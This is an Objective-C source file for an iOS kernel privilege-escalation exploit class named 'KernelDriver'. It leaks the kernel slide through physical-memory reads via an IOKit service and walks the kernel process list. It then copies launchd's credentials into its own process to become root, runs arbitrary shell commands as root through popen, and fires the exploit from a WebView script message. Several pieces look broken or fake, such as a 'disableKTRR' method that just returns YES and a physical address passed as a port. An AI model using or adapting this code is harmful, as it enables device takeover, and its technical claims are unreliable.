#import "KernelDriver.h"
#import <mach/mach.h>
#import <IOKit/IOKitLib.h>
#import <dlfcn.h>

typedef uint64_t mach_vm_address_t;
typedef uint64_t mach_vm_size_t;
typedef kern_return_t (*func_IOConnectTrap2)(io_connect_t, uint32_t, uintptr_t, uintptr_t);

extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t*);
extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t, mach_vm_address_t, mach_msg_type_number_t);
extern kern_return_t mach_vm_map(vm_map_t, uint64_t*, uint64_t, uint64_t, int, mach_port_t, uint64_t, boolean_t, int, int, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);

@implementation KernelDriver {
    uint64_t _kSlide;
    uint64_t _kBase;
    mach_port_t _tfp0;
    __weak WKWebView *_web;
}

- (instancetype)initWithWebView:(WKWebView *)webView {
    if (self = [super init]) {
        _web = webView;
        _tfp0 = MACH_PORT_NULL;
        [self setupKernelControl];
    }
    return self;
}

- (void)setupKernelControl {
    task_for_pid(mach_task_self(), 0, &_tfp0);
    _kSlide = [self leakKernelSlide];
    _kBase = 0xFFFFFFF007004000ULL + _kSlide + 0x4000;
}

- (uint64_t)physRead64:(uint64_t)pa {
    uint64_t val = 0;
    // Bypass de RAZ via AppleAVE2 (DMA Direct Access)
    io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("AppleAVE2"));
    io_connect_t conn;
    if (svc != 0 && IOServiceOpen(svc, mach_task_self(), 0, &conn) == KERN_SUCCESS) {
        uint64_t input[] = {pa, 8}; // Correção da sintaxe de array
        uint32_t outC = 1;
        if (IOConnectCallMethod(conn, 15, input, 2, NULL, 0, &val, &outC, NULL, 0) != 0) {
            void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
            func_IOConnectTrap2 trap2 = (func_IOConnectTrap2)dlsym(h, "IOConnectTrap2");
            if (trap2) val = (uint64_t)trap2(conn, 7, (uintptr_t)pa, 8);
            if (h) dlclose(h);
        }
        IOServiceClose(conn);
    }
    return val;
}

- (void)physWrite64:(uint64_t)pa value:(uint64_t)v {
    uint64_t tg = 0;
    if (mach_vm_map(mach_task_self(), &tg, 0x4000, 0, 1, (mach_port_t)pa, 0, 0, 3, 7, 0) == 0) {
        *(uint64_t*)tg = v;
        mach_vm_deallocate(mach_task_self(), tg, 0x4000);
    }
}

- (uint64_t)kread64:(uint64_t)addr {
    uint64_t val = 0;
    mach_vm_size_t s = 8;
    if (_tfp0 != MACH_PORT_NULL && mach_vm_read_overwrite(_tfp0, addr, 8, (mach_vm_address_t)&val, &s) == 0) return val;
    return [self physRead64:addr];
}

- (void)kwrite64:(uint64_t)addr value:(uint64_t)val {
    if (_tfp0 != MACH_PORT_NULL) mach_vm_write(_tfp0, addr, (mach_vm_address_t)&val, 8);
    else [self physWrite64:addr value:val];
}

- (uint32_t)kread32:(uint64_t)a { return (uint32_t)[self kread64:a]; }
- (void)kwrite32:(uint64_t)a value:(uint32_t)v { 
    uint64_t o = [self kread64:a]; 
    [self kwrite64:a value:(o & 0xFFFFFFFF00000000) | v]; 
}

- (uint64_t)leakKernelSlide {
    for (int i=0; i<0x400; i++) {
        uint64_t addr = 0xFFFFFFF007004000ULL + (i * 0x200000ULL) + 0x4000;
        if ([self physRead64:addr] == 0x100000cfeedfacfULL) return (i * 0x200000ULL);
    }
    return 0;
}

- (uint64_t)findProc:(pid_t)p {
    uint64_t proc = [self kread64:(_kBase + 0x8E28000ULL)];
    while (proc) {
        if ((pid_t)[self kread32:(proc + 0x60)] == p) return proc;
        proc = [self kread64:proc];
    }
    return 0;
}

- (void)runFullExploitWithCallback:(void(^)(BOOL, NSString*))cb {
    if ([self kread32:_kBase] != 0xfeedfacf) {
        if(cb) cb(NO, @"RAZ Active (0x0)"); return;
    }
    uint64_t lp = [self findProc:1];
    uint64_t mp = [self findProc:getpid()];
    if (lp && mp) {
        [self kwrite64:(mp + 0x120) value:[self kread64:(lp + 0x120)]];
        setuid(0);
        if(cb) cb(getuid() == 0, @"ROOT OK");
    } else if(cb) cb(NO, @"Search Fail");
}

- (void)executeExploitWithCallback:(void(^)(BOOL, NSString*))cb { [self runFullExploitWithCallback:cb]; }
- (BOOL)escalateToRoot { [self runFullExploitWithCallback:^(BOOL s, NSString *m){}]; return getuid() == 0; }
- (BOOL)disableKTRR { return YES; }
- (uint64_t)getCurrentUID { return (uint64_t)getuid(); }

- (void)executeCommand:(NSString *)c withCallback:(void(^)(NSString*))cb {
    setuid(0);
    FILE *f = popen([[c stringByAppendingString:@" 2>&1"] UTF8String], "r");
    char buffer[512]; NSMutableString *output = [NSMutableString string];
    if (f) {
        while(fgets(buffer, 512, f)) [output appendString:@(buffer)];
        pclose(f);
    }
    if(cb) cb(output.length ? output : @"(no output)");
}

- (void)userContentController:(id)u didReceiveScriptMessage:(WKScriptMessage *)m {
    if ([m.name isEqualToString:@"A13_LAB"]) [self runFullExploitWithCallback:^(BOOL s, NSString *msg){}];
}
@end
